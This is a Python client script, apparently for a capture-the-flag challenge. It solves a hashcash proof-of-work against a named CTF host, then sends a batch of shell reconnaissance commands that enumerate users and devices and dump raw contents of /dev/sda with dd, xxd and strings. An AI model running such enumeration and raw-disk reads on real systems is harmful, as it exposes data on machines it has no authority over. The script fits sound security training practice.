import argparse
import os
import queue
import re
import signal
import socket
import subprocess
import threading
import time

DEFAULT_HOST = "ctf.vulnbydefault.com"
DEFAULT_PORT = 30218
DEFAULT_WORKERS = max(2, (os.cpu_count() or 4))


def solve_pow_parallel(resource: str, workers: int) -> str:
    result_q: queue.Queue[str] = queue.Queue()
    procs: list[subprocess.Popen] = []

    def worker(index: int) -> None:
        ext = f"w{index:02d}"
        cmd = ["hashcash", "-mb32", "-O", "openssl", "-x", ext, resource]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        procs.append(proc)
        out, _ = proc.communicate()
        if proc.returncode == 0:
            stamp = out.strip().splitlines()[-1].strip()
            if stamp:
                result_q.put(stamp)

    threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(workers)]
    start = time.time()
    for t in threads:
        t.start()

    stamp = result_q.get()

    for proc in procs:
        if proc.poll() is None:
            try:
                proc.send_signal(signal.SIGTERM)
            except Exception:
                pass
    print(f"[+] PoW solved in {time.time() - start:.1f}s with {workers} workers", flush=True)
    return stamp


def recv_until_quiet(sock: socket.socket, quiet_rounds: int = 6, timeout: float = 0.3) -> bytes:
    sock.settimeout(timeout)
    data = b""
    quiet = 0
    while quiet < quiet_rounds:
        try:
            chunk = sock.recv(8192)
        except TimeoutError:
            quiet += 1
            continue
        if not chunk:
            break
        data += chunk
        quiet = 0
    return data


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="PoW + command executor for feedback challenge")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS)
    parser.add_argument("--retries", type=int, default=1)
    parser.add_argument("--retry-sleep", type=float, default=1.5)
    return parser.parse_args()


def run_once(args: argparse.Namespace) -> bool:
    with socket.create_connection((args.host, args.port), timeout=10) as sock:
        banner = sock.recv(4096)
        print(banner.decode("latin1", "ignore"), end="")
        m = re.search(rb"hashcash -mb32 ([^\s\r\n]+)", banner)
        if not m:
            raise SystemExit("[-] PoW token not found")
        resource = m.group(1).decode()
        print(f"[+] resource: {resource}", flush=True)

        stamp = solve_pow_parallel(resource, args.workers)
        print(f"[+] stamp: {stamp}", flush=True)
        sock.sendall(stamp.encode() + b"\n")

        time.sleep(0.5)
        boot = recv_until_quiet(sock).decode("latin1", "ignore")
        print(boot, end="")
        if "Failed to get \"write\" lock" in boot or "gdbstub: couldn't create chardev" in boot:
            print("[-] VM boot collision detected; retrying...", flush=True)
            return False

        cmd = (
            "id; whoami; uname -a; "
            "ls -la /dev | grep -E 'feedback|sd|vd|hd'; "
            "echo '--- blocks ---'; cat /proc/partitions; "
            "echo '--- /dev/sda hexdump ---'; dd if=/dev/sda bs=1 count=256 | xxd -g 1 -c 32; "
            "echo '--- /dev/sda strings ---'; strings /dev/sda | head -n 50; "
            "echo '--- cat /dev/sda head ---'; cat /dev/sda | head -c 256; echo; "
            "echo DONE\n"
        )
        sock.sendall(cmd.encode())
        out = recv_until_quiet(sock, quiet_rounds=12, timeout=0.4)
        print(out.decode("latin1", "ignore"), end="")
        return True


def main() -> None:
    args = parse_args()
    for attempt in range(1, args.retries + 1):
        print(f"\n=== attempt {attempt}/{args.retries} ===", flush=True)
        ok = run_once(args)
        if ok:
            return
        if attempt < args.retries:
            time.sleep(args.retry_sleep)
    raise SystemExit("[-] All retries exhausted. Renew instance or change port.")


if __name__ == "__main__":
    main()
